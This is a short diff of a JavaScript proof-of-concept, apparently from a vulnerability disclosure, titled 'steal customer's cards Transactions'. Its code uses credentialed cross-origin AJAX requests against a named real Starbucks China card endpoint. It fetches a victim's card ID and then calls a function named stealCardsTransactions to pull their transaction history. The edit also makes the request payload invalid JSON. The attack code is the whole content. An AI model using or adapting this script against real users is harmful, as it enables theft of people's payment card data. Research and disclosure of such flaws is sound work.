@@ -37,7 +37,7 @@ steal customer's cards Transactions
 			     withCredentials: true
 			 },
 			    success : function(response, textStatus, jqXhr) {
-				document.getElementById("customer").innerHTML = response;
+				document.getElementById("customer").innerHTML = JSON.stringify(response);
 				cardsID = response.data[0].id;
                                 console.log(cardsID);
 			    },
@@ -53,7 +53,7 @@ steal customer's cards Transactions
 	
 		
 	function stealCardsTransactions(){
-		var data = '{"data":{"id":"'+cardsID+'","page":{"page":1,"limit":10},"isNew":true}}';
+		var data = '{data:{id:'+cardsID+',page:{page:1,limit:10},isNew:true}}';
 		$.ajax({
 			    url : 'https://cards.starbucks.com.cn/cards/transactions',
 			    type : 'POST',
